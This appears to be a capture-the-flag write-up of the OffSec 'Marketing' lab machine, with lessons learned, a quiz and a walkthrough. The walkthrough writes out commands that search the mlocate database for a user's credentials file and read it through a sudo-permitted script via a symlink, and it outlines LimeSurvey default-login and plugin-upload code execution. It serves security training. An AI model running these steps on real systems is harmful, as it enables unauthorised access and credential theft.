Lessons learned#
The source code hides the real surface. The root gave nothing; the subdomain in the HTML was the whole path. Reading source and fuzzing vhosts is not optional.
Default credentials and their reuse chain together. admin/password opened LimeSurvey and its database password opened a system user. The same password in different places is the chain's glue.
Being in mlocate leaks the system tree. We didn't read the file, but we knew it existed and where. A seemingly harmless group revealed private paths.
A sudo script that follows symlinks is arbitrary read. sync.sh ran as m.sander and its diff dumped a file we didn't own. Privileged scripts must resolve and validate paths, never follow links blindly.
The sudo group closes the box. Once on m.sander, sudo su was all it took. Checking id and sudo -l on each user is what unlocked every hop.
Quick review
1. The scan only returned SSH and HTTP on the root. What exposed the real attack surface?

The page source code, which referenced the customers-survey.marketing.pg subdomain
A UDP sweep that revealed additional services listening on high ports of the target
A robots.txt file that disallowed internal admin-panel routes
A DNS zone transfer against port 53 that listed every subdomain of the host
2. How was execution as www-data obtained in LimeSurvey?

By writing a webshell via LFI into Apache logs included by the app
By loading a survey template with Twig code injected into a field
By uploading a malicious (PHP) plugin from the admin panel
By exploiting a SQL injection in the panel's login form
3. What enabled the pivot from www-data to the user t.miller?

The password in LimeSurvey's config.php, reused for t.miller
A Kerberos ticket exported from the Apache process memory
A forgotten SSH private key left in t.miller's home directory
An NTLM hash cracked from the dumped LimeSurvey database
4. What was the point of belonging to the mlocate group?

To run the updatedb binary with elevated privileges
To read mlocate.db and discover the path to m.sander's credentials file
To modify the locate index and inject fake paths
To mount m.sander's home directory through a group link
5. How did sync.sh reveal m.sander's password?

By honoring an environment variable that overrode the diff binary path
It was handed a symlink to the credentials file and its diff, running as m.sander, dumped the contents
By escalating straight to root because the script had the SUID bit set
By logging the password in cleartext into a file we could actually read

# Marketing – OffSec PG Practice Writeup

Intermediate

Linux

The Linux version follows this attack chain:

1. Apache enumeration and virtual-host discovery.
    
2. Hidden `customers-survey.marketing.pg` subdomain.
    
3. LimeSurvey default credentials (`admin:password`).
    
4. Authenticated LimeSurvey plugin-upload RCE.
    
5. Obtain a `www-data` shell.
    
6. Recover database credentials and switch to `t.miller`.
    
7. Abuse a sudo-permitted script to read another user's credentials.
    
8. Switch to `m.sander` and obtain root through sudo.
    

Source walkthroughs: [Marketing – HackIndex](https://hackindex.io/index.php/writeups/marketing?utm_source=chatgpt.com) · [Marketing Linux – detailed walkthrough](https://morimori-dev.github.io/en/posts/pg-marketing/?utm_source=chatgpt.com).

## 6. t.miller to m.sander

Check sudo permissions:

```
sudo -l
```

The important permission is:

```
(m.sander) /usr/bin/sync.sh
```

Inspect the script:

```
cat /usr/bin/sync.sh
```

The script checks a supplied filename for the string `m.sander`, then compares the supplied file against:

```
/home/m.sander/personal/notes.txt
```

The filename validation can be bypassed using a symbolic link.

First, enumerate filenames through the mlocate database:

```
strings /var/lib/mlocate/mlocate.db | grep -A3 -B3 personal
```

The interesting file is:

```
/home/m.sander/personal/creds-for-2022.txt
```

Create a symbolic link:

```
ln -s /home/m.sander/personal/creds-for-2022.txt abc
```

Execute the script as m.sander:

```
sudo -u m.sander /usr/bin/sync.sh abc
```

The script's difference output discloses the contents of the credentials file.

Use the recovered password to switch users:

```
su m.sander
```
